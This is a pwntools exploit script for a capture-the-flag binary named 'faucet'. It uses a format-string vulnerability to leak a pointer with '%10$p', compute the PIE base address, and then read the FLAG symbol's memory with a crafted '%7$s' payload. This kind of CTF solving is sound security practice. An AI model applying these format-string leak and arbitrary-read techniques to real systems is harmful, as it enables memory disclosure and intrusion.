#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./faucet')

if args.REMOTE:
	p = remote('challenge.ctf.games', 31230)
else:
	p = process(binary.path)

# get base address
p.recvuntil(b'[5]')
p.sendlineafter(b'> ',b'5')
p.sendlineafter(b': ',b'%10$p')
p.recvuntil(b'You have bought a ')
_start = int(p.recvline().strip(),16)
binary.address = _start - binary.sym._start
log.info('binary.address: ' + hex(binary.address))

# get flag
p.recvuntil(b'[5]')
p.sendlineafter(b'> ',b'5')
p.sendlineafter(b': ',b'%00007$s' + p64(binary.sym.FLAG))
p.recvuntil(b'You have bought a ')
log.info('flag: ' + p.recvline().strip().decode())
p.close()
